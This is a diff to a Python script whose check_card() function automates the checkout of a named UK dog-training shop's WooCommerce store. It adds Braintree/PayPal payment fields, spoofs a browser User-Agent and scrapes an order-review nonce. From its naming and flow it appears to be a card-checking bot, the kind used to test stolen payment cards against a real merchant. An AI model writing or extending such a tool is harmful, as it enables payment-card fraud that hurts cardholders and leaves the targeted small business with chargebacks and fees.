@@ -42,11 +42,21 @@ def check_card():
     
     url = "https://southenddogtraining.co.uk/shop/training-purchases/membership/monthly-membership/"
     
+    params = {
+  'wc-ajax': "add_to_cart"
+}
+
     payload = {
-        'action': 'buy now',
-        'add-to-cart': '359',
-        'product_id': '359'
-    }
+  'quantity': "1",
+  'product_id': "359",
+  'gtm4wp_product_data': "{\"internal_id\":359,\"item_id\":359,\"item_name\":\"Monthly+Membership\",\"sku\":359,\"price\":11.99,\"stocklevel\":135,\"stockstatus\":\"instock\",\"google_business_vertical\":\"retail\",\"item_category\":\"Membership\",\"id\":359}",
+  'wc_braintree_paypal_amount': "11.99",
+  'wc_braintree_paypal_currency': "GBP",
+  'wc_braintree_paypal_locale': "en_gb",
+  'wc_braintree_paypal_single_use': "",
+  'wc_braintree_paypal_needs_shipping': "",
+  'wc_braintree_paypal_product_id': "359"
+}
     
     headers = {
         'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
@@ -66,7 +76,7 @@ def check_card():
         'priority': "u=0, i",
     }
     
-    response = r.post(url, data=payload, headers=headers)
+    response = r.post(url, params=params, data=payload, headers=headers)
     
     updatenonce_match = re.search(r'"update_order_review_nonce"\s*:\s*"([^"]+)"', response.text)
     if not updatenonce_match:
